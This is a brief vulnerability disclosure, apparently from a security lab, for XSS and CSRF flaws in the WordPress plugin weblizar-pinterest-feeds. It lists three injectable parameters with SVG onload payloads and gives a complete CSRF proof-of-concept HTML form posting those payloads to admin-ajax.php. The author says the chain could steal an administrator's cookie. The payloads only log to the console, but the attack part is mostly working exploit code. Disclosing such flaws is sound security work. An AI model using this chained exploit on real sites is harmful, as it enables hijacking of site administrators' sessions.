Well ,sir ,I just found a XSS bug and a CSRF bug at wp-plugin weblizar-pinterest-feeds.

#### ADLab of Venustech

#### XSS

```
http://127.0.0.1/wordpress/wp-admin/admin-ajax.php
```

When I pentest the  parameter, I found it does not filter well.

Weak data parameters:

```
1.PFFREE_Access_Token=test'"><svg/onload=console.log(/xss1/)><'"
2.weblizar_pffree_settings_save_get-users=1'"><svg/onload=console.log(/xss2/)><'"
3.action=pffree_security&security=test'"><svg/onload=console.log(/xss3/)><'"

```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/weblizar-pinterest-feeds/xss.png)


#### CSRF

Well, the xss here need to combined with a csrf bug. Because no csrf protection here, we can cheat the admin user to visit the evil html on the evil site.

POC:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/wordpress/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="PFFREE&#95;Access&#95;Token" value="test&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss1&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="weblizar&#95;pffree&#95;settings&#95;save&#95;get&#45;users" value="1&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss2&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="action" value="pffree&#95;security" />
      <input type="hidden" name="security" value="test&apos;&quot;&gt;&lt;svg&#47;onload&#61;console&#46;log&#40;&#47;xss3&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

In a word, if the manager could be cheated to visit my evil html on my site, I can get the manager's cookie easily, or do something more evilly.


Well,  by the way, I just test the bug in the wordpress 4.9.1 and the latest version of the wp-plugin weblizar-pinterest-feeds.
